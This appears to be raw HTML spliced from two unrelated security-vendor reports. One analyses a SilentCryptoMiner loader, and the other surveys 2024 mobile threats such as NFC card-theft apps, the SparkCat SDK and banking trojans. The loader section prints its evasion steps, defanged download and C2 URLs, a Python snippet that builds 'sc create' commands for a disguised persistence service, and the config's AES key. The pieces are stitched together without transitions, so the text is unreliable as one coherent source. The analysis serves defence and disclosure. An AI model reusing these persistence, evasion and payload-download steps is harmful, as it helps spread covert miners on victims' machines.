Below are the execution steps for this script:</p>\n<ol>\n<li>Scanning the current environment for artifacts of running on a virtual machine or in a sandbox. The loader compares system data (computer and user names, MAC addresses, unique disk identifiers (HWID), GPU parameters, etc.) with predefined lists of values used by virtual environments.</li>\n<li>Adding the AppData directory to Microsoft Defender exclusions.</li>\n<li>GET request to <pre class=\"crayon-plain-tag\">http://193.233.203[.]138/WjEjoHCj/t</pre>. Depending on the response (<pre class=\"crayon-plain-tag\">true/false</pre>) and the specified probability, the script either downloads the executable file from the server at <pre class=\"crayon-plain-tag\">http://9x9o[.]com/q.txt</pre>, or uses a hardcoded block of data in Base64 format. The resulting file is saved at <pre class=\"crayon-plain-tag\">%LocalAppData%\\driverpatch9t1ohxw8\\di.exe</pre>.</li>\n<li>Modifying the payload. The executable file just written to disk is modified by appending random blocks of data to the end until it reaches 690\u00a0MB in size. This technique is used to hinder automatic analysis by antivirus solutions and sandboxes.</li>\n<li>Gaining persistence in the system. The loader creates a service named DrvSvc and sets its description to that of the legitimate Windows Image Acquisition (WIA) service:<br />\n<pre class=\"crayon-plain-tag\">svc_name = \"DrvSvc\"\nsvc_desc = \"Launches applications associated with still image acquisition events.\"\ncmd_create = f'sc create {svc_name} binPath= \"{exe_path}\" start= auto'\ncmd_desc = f'sc description {svc_name} \"{svc_desc}\"'</pre>\n</li>\n</ol>\n<h2 id=\"silentcryptominer\">SilentCryptoMiner</h2>\n<p>The downloaded <pre class=\"crayon-plain-tag\">di.exe</pre> is a <a href=\"https://securelist.com/miner-campaign-misuses-open-source-siem-agent/114022/\" rel=\"noopener\" target=\"_blank\">SilentCryptoMiner</a> sample based on the open-source miner XMRig. This is a covert miner able to mine multiple cryptocurrencies (ETH, ETC, XMR, RTM and others) using various algorithms. For stealth, SilentCryptoMiner employs <a href=\"https://attack.mitre.org/techniques/T1055/012/\" rel=\"noopener\" target=\"_blank\">process hollowing</a> to inject the miner code into a system process (in this case, <pre class=\"crayon-plain-tag\">dwm.exe</pre>). The malware is able to stop mining while the processes specified in the configuration are active. It can be controlled remotely via a web panel. The miner is coded to scan for indicators of running in a virtual environment and check the size of the executable itself, which must be at least 680\u00a0MB and no more than 800\u00a0MB\u00a0\u2013 this is how the attackers make sure that the miner was run by the above-described loader.</p>\n<p>The miner configuration is Base64-encoded and encrypted using the AES-CBC algorithm with the key <pre class=\"crayon-plain-tag\">UXUUXUUXUUCommandULineUUXUUXUUXU</pre> and the initialization vector <pre class=\"crayon-plain-tag\">UUCommandULineUU</pre>.

The scammers employed phishing websites to spread malicious mods of the legitimate app NFCGate. These used a variety of pretexts to persuade the victim to place a bank card next to the back of their phone for an NFC connection. The card details were leaked to the fraudsters who then made small contactless payments or withdrew money at ATMs.</p>\n<p>A similar scheme was later spotted in Russia, where malware masqueraded as banking and e-government apps. The SpyNote RAT was occasionally used as the malware dropper and NFC activator.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115499\" style=\"width: 621px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/02/14152202/2mobile-report-2024.png\"><img alt=\"A screenshot of the fake mobile app\" class=\"size-full wp-image-115499\" height=\"975\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/02/14152202/2mobile-report-2024.png\" width=\"611\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115499\">A screenshot of the fake mobile app</p></div>\n<details>\nSee translation\n<p>Hold your card against the NFC contactless payment module for verification.<br />\nReady to scan</p>\n</details>\n<p>Also in 2024, we detected many new preinstalled malicious apps that we assigned the generalized verdict of Trojan.AndroidOS.Adinstall.

It was located inside an infected system application <a href=\"http://com.google.android.services/\" rel=\"noopener\" target=\"_blank\">com.google.android.services</a><strong>.</strong>\u00a0The malware was capable of running arbitrary executables and downloading and installing any APKs.</p>\n<p>On top of the above, we discovered several apps on Google Play, each containing a malicious SDK implant named &#8220;SparkCat&#8221;, which began to spread at least as early as March 2024. Infected apps were deleted by the store in February 2025: nevertheless, our telemetry data shows that other apps containing SparkCat are distributed through unofficial sources.</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/02/14152407/3mobile-report-2024.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115500\" height=\"743\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/02/14152407/3mobile-report-2024-1024x743.png\" width=\"1024\" /></a></p>\n<p>This SDK received a C2 server command with a list of keywords or dictionaries to search the gallery on the device for images to exfiltrate.

This may suggest that scammers began to scale down their efforts to generate unique applications, focusing instead on distributing the same files to a maximum number of victims.</p>\n<h4 id=\"top-10-mobile-bankers\">TOP 10 mobile bankers</h4>\n<table>\n<tbody>\n<tr>\n<td><strong>Verdict</strong></td>\n<td><strong>%* 2023</strong></td>\n<td><strong>%* 2024</strong></td>\n<td><strong>Difference in p.p.</strong></td>\n<td><strong>Change in ranking</strong></td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Mamont.bc</td>\n<td>0.00</td>\n<td>36.70</td>\n<td>+36.70</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Agent.rj</td>\n<td>0.00</td>\n<td>11.14</td>\n<td>+11.14</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Mamont.da</td>\n<td>0.00</td>\n<td>4.36</td>\n<td>+4.36</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Coper.a</td>\n<td>0.51</td>\n<td>3.58</td>\n<td>+3.07</td>\n<td>+30</td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.UdangaSteal.b</td>\n<td>0.00</td>\n<td>3.17</td>\n<td>+3.17</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Agent.eq</td>\n<td>21.79</td>\n<td>3.10</td>\n<td>\u201318.69</td>\n<td>\u20134</td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Mamont.cb</td>\n<td>0.00</td>\n<td>3.05</td>\n<td>+3.05</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Bian.h</td>\n<td>23.13</td>\n<td>3.02</td>\n<td>\u201320.11</td>\n<td>\u20137</td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Faketoken.z</td>\n<td>0.68</td>\n<td>2.96</td>\n<td>+2.29</td>\n<td>+18</td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Coper.c</td>\n<td>0.00</td>\n<td>2.84</td>\n<td>+2.84</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p><strong><em>* Share of unique users who encountered this malware as a percentage of all users of Kaspersky mobile security solutions who encountered banking threats</em></strong></p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>The number of unique malware and unwanted software installation packages continued to decline year to year in 2024. However, the rate of that decline slowed down. The upward trend in mobile banking Trojan activity persisted despite the years-long decrease in unique installation packages.</p>\n<p>Cybercriminals kept trying to sneak malware into official app stores like Google Play, but we also discovered a fair number of diverse preinstalled malicious apps in 2024. Speaking of interesting techniques first spotted last year, the use of NFC for stealing bank card data stands out.</p>"
